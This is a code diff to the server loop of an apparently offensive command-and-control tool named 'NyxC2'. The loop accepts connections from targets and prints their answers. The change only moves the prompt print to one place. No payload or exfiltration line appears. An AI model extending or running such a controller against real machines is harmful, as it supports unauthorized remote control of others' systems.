@@ -16,7 +16,6 @@ def server():
             if elem == soc:
                 (clientsocket, addressguest) = soc.accept()
                 print(f"Connection from {addressguest}")
-                print("NyxC2 > ", end="", flush=True)
                 if not clientsocket in server_list:
                     server_list.append(clientsocket)
                 if not addressguest in dict_ip:
@@ -77,7 +76,6 @@ def server():
                     new_data = elem.recv(4096)
                     if not new_data:
                         print(f"connection lost with {nom_cible}")
-                        print("NyxC2 > ", end="", flush=True)
                         server_list.remove(elem)
                         if nom_cible in dict_ip:
                             del dict_ip[nom_cible]
@@ -89,14 +87,13 @@ def server():
                             
                         if new_data:
                             print(f"\n[answer from {nom_cible}] :\n {new_data}")
-                            print("NyxC2 > ", end="", flush=True)
                 except ConnectionResetError:
                     print(f"connection brutally interrupted with {nom_cible}")
-                    print("NyxC2 > ", end="", flush=True)
                     if nom_cible in dict_ip:
                             del dict_ip[nom_cible]
                     server_list.remove(elem)
                     elem.close()
+                print("NyxC2 > ", end="", flush=True)
                     
                 
 
